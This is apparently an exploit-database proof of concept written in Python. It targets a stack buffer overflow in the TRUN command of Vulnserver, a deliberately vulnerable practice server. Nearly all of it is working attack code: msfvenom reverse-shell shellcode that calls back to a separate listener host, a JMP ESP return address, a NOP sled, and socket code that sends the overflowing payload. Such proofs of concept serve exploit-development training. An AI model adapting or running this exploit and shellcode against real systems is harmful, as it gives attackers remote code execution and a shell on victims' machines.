# Exploit Title: Vuln Server  - Remote Buffer Overflow TRUN command
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
# Software Link: http://sites.google.com/site/lupingreycorner/vulnserver.zip
# Version: NA
# Tested on: Windows XP SP2

#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.102"
port=9999
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -b '\x00\x0a\x0d' -f python
buf =  ""
buf += "\xb8\x9b\xb6\x6b\x1c\xdd\xc7\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x70\x4a\x89"
buf += "\xe9\x7a\x5b\xcc\x12\x82\x9c\xb1\x9b\x67\xad\xf1\xf8"
buf += "\xec\x9e\xc1\x8b\xa0\x12\xa9\xde\x50\xa0\xdf\xf6\x57"
buf += "\x01\x55\x21\x56\x92\xc6\x11\xf9\x10\x15\x46\xd9\x29"
buf += "\xd6\x9b\x18\x6d\x0b\x51\x48\x26\x47\xc4\x7c\x43\x1d"
buf += "\xd5\xf7\x1f\xb3\x5d\xe4\xe8\xb2\x4c\xbb\x63\xed\x4e"
buf += "\x3a\xa7\x85\xc6\x24\xa4\xa0\x91\xdf\x1e\x5e\x20\x09"
buf += "\x6f\x9f\x8f\x74\x5f\x52\xd1\xb1\x58\x8d\xa4\xcb\x9a"
buf += "\x30\xbf\x08\xe0\xee\x4a\x8a\x42\x64\xec\x76\x72\xa9"
buf += "\x6b\xfd\x78\x06\xff\x59\x9d\x99\x2c\xd2\x99\x12\xd3"
buf += "\x34\x28\x60\xf0\x90\x70\x32\x99\x81\xdc\x95\xa6\xd1"
buf += "\xbe\x4a\x03\x9a\x53\x9e\x3e\xc1\x3b\x53\x73\xf9\xbb"
buf += "\xfb\x04\x8a\x89\xa4\xbe\x04\xa2\x2d\x19\xd3\xc5\x07"
buf += "\xdd\x4b\x38\xa8\x1e\x42\xff\xfc\x4e\xfc\xd6\x7c\x05"
buf += "\xfc\xd7\xa8\x8a\xac\x77\x03\x6b\x1c\x38\xf3\x03\x76"
buf += "\xb7\x2c\x33\x79\x1d\x45\xde\x80\xf6\xaa\xb7\x8a\x6e"
buf += "\x43\xca\x8a\x7f\xcf\x43\x6c\x15\xff\x05\x27\x82\x66"
buf += "\x0c\xb3\x33\x66\x9a\xbe\x74\xec\x29\x3f\x3a\x05\x47"
buf += "\x53\xab\xe5\x12\x09\x7a\xf9\x88\x25\xe0\x68\x57\xb5"
buf += "\x6f\x91\xc0\xe2\x38\x67\x19\x66\xd5\xde\xb3\x94\x24"
buf += "\x86\xfc\x1c\xf3\x7b\x02\x9d\x76\xc7\x20\x8d\x4e\xc8"
buf += "\x6c\xf9\x1e\x9f\x3a\x57\xd9\x49\x8d\x01\xb3\x26\x47"
buf += "\xc5\x42\x05\x58\x93\x4a\x40\x2e\x7b\xfa\x3d\x77\x84"
buf += "\x33\xaa\x7f\xfd\x29\x4a\x7f\xd4\xe9\x7a\xca\x74\x5b"
buf += "\x13\x93\xed\xd9\x7e\x24\xd8\x1e\x87\xa7\xe8\xde\x7c"
buf += "\xb7\x99\xdb\x39\x7f\x72\x96\x52\xea\x74\x05\x52\x3f"
#0x625011AF JMP ESP
buffer = "TRUN /.:/" + "A" *2003 + "\xaf\x11\x50\x62"  + "\x90" *32 + buf

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.recv(1024)
expl.close()
